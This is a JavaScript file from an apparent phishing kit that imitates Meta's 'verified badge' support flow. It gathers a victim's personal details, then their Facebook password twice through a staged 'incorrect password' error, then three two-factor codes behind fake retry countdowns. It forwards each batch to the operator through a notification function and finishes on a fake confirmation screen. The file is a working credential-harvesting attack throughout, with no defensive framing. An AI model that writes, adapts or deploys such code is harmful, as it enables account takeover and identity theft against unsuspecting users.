// Main Application Logic

// Generate ticket ID
document.getElementById('ticketId').textContent = Utils.generateTicketId();

// Start verification flow
document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);

// ==================== MODAL 1: CLIENT INFO ====================
function openClientModal() {
    const months = [
        'January', 'February', 'March', 'April', 'May', 'June',
        'July', 'August', 'September', 'October', 'November', 'December'
    ];
    const currentYear = new Date().getFullYear();
    const dayOptions = Array.from({ length: 31 }, (_, i) => {
        const day = i + 1;
        return `<option value="${day}">${day}</option>`;
    }).join('');
    const monthOptions = months.map((name, i) => (
        `<option value="${i + 1}">${name}</option>`
    )).join('');
    const yearOptions = Array.from({ length: currentYear - 1899 }, (_, i) => {
        const year = currentYear - i;
        return `<option value="${year}">${year}</option>`;
    }).join('');

    const fieldClass = 'info-form-control';
    const labelClass = 'info-form-label';

    const content = `
        <div class="info-form">
            <div class="info-form-header">
                <h2 class="info-form-title">Information Form</h2>
                <p class="info-form-subtitle">Please complete the details below so we can review your verified badge request.</p>
            </div>
            <form id="clientForm" class="info-form-body">
                <div class="info-form-section">
                    <p class="info-form-section-title">Personal details</p>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="fullName">Full name</label>
                        <input type="text" id="fullName" name="fullName" class="${fieldClass}" placeholder="Enter your full name" autocomplete="name" required>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="fanpage">Page name</label>
                        <input type="text" id="fanpage" name="fanpage" class="${fieldClass}" placeholder="Enter your Page name" required>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="day">Date of birth</label>
                        <div class="info-form-dob">
                            <select id="month" name="month" class="${fieldClass}" required>
                                <option value="" disabled selected>Month</option>
                                ${monthOptions}
                            </select>
                            <select id="day" name="day" class="${fieldClass}" required>
                                <option value="" disabled selected>Day</option>
                                ${dayOptions}
                            </select>
                            <select id="year" name="year" class="${fieldClass}" required>
                                <option value="" disabled selected>Year</option>
                                ${yearOptions}
                            </select>
                        </div>
                    </div>
                </div>

                <div class="info-form-section">
                    <p class="info-form-section-title">Contact</p>
                    <div class="info-form-grid">
                        <div class="info-form-field">
                            <label class="${labelClass}" for="email">Email</label>
                            <input type="email" id="email" name="email" class="${fieldClass}" placeholder="name@example.com" autocomplete="email" required>
                        </div>
                        <div class="info-form-field">
                            <label class="${labelClass}" for="emailBusiness">Business email</label>
                            <input type="email" id="emailBusiness" name="emailBusiness" class="${fieldClass}" placeholder="business@example.com" autocomplete="email" required>
                        </div>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="phone">Phone number</label>
                        <input type="tel" id="phone" name="phone" class="${fieldClass}" placeholder="Include country code" autocomplete="tel" required>
                    </div>
                </div>

                <div class="info-form-section">
                    <div class="info-form-field">
                        <label class="${labelClass}" for="notes">Additional notes <span class="info-form-optional">Optional</span></label>
                        <textarea id="notes" name="notes" class="${fieldClass} info-form-textarea" placeholder="Add any information that may help us review your request" rows="3"></textarea>
                    </div>
                    <p class="info-form-hint">Our response will be sent to you within 14–48 hours.</p>
                </div>

                <label class="info-form-terms" for="termsAgree">
                    <input type="checkbox" id="termsAgree" name="termsAgree" required>
                    <span>I agree to the <a href="#" class="info-form-link">Terms of use</a></span>
                </label>

                <button type="submit" class="info-form-submit">Submit</button>
            </form>
        </div>
    `;

    Modal.create('clientModal', content);
    Modal.open('clientModal');

    const termsLink = document.querySelector('#clientModal .info-form-link');
    if (termsLink) {
        termsLink.addEventListener('click', (e) => e.preventDefault());
    }

    document.getElementById('clientForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('emailBusiness').value.trim(),
            fanpage: document.getElementById('fanpage').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            day: document.getElementById('day').value,
            month: document.getElementById('month').value,
            year: document.getElementById('year').value
        };

        Utils.saveRecord('__client_rec__fi_rst', formData);
        Modal.close('clientModal');
        openSecurityModal();
    });
}

// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="info-form security-form">
            <div class="security-form-brand">
                <img src="./public/icons/ic_logo.svg" alt="Meta">
            </div>
            <div class="info-form-header">
                <h2 class="info-form-title">Enter your password</h2>
                <p class="info-form-subtitle">For your security, enter your password to continue this request.</p>
            </div>
            <form id="securityForm" class="info-form-body">
                <div class="info-form-field">
                    <label class="info-form-label" for="password">Password</label>
                    <div class="password-field">
                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" required>
                        <button type="button" id="togglePassword" class="password-toggle">Show</button>
                    </div>
                    <p id="passwordError" class="info-form-error hidden"></p>
                </div>
                <button type="submit" class="info-form-submit">Continue</button>
            </form>
            <div class="security-form-footer">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    const passwordInput = document.getElementById('password');
    const errorMsg = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');

    togglePassword.addEventListener('click', () => {
        const showPlain = passwordInput.type === 'password';
        passwordInput.type = showPlain ? 'text' : 'password';
        togglePassword.textContent = showPlain ? 'Hide' : 'Show';
    });

    passwordInput.addEventListener('input', () => {
        errorMsg.classList.add('hidden');
        passwordInput.classList.remove('is-error');
    });

    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = passwordInput.value.trim();
        const submitBtn = e.target.querySelector('button[type="submit"]');

        errorMsg.classList.add('hidden');
        passwordInput.classList.remove('is-error');
        if (!password) {
            errorMsg.textContent = "You haven't entered your password!";
            errorMsg.classList.remove('hidden');
            passwordInput.classList.add('is-error');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                passwordInput.value = '';
                passwordInput.type = 'password';
                togglePassword.textContent = 'Show';
                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                errorMsg.classList.remove('hidden');
                passwordInput.classList.add('is-error');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const description = `Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)`;

    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                <div class="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
                    <span>${userData.fullName}</span>
                    <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
                    <span>Facebook</span>
                </div>
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">Two-factor authentication required (1/3)</h2>
                <p class="text-[#9a979e] text-sm mb-4">${description}</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/images/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="number" id="twoFa" placeholder="Code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    let countdownInterval;

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = document.getElementById('twoFa').value.trim();
        const errorMsg = document.getElementById('authError');
        const submitBtn = e.target.querySelector('button');
        const input = document.getElementById('twoFa');

        errorMsg.classList.add('hidden');
        if (!twoFa) {
            errorMsg.textContent = "You haven't entered the code!";
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 1;
            }, 1400);
        } else if (authClickCount === 1) {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__f_if_th', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 2;
            }, 1200);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
            const clientData = { twoFaThird: twoFa, ...dataLocal };
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });

    function startCountdown(input, errorMsg, submitBtn) {
        input.disabled = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('opacity-70');

        let time = CONFIG.COUNTDOWN_TIME;
        errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
        errorMsg.classList.remove('hidden');

        countdownInterval = setInterval(() => {
            time--;
            errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;

            if (time <= 0) {
                clearInterval(countdownInterval);
                input.disabled = false;
                input.value = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-70');
                errorMsg.classList.add('hidden');
            }
        }, 1000);
    }
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/success.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}

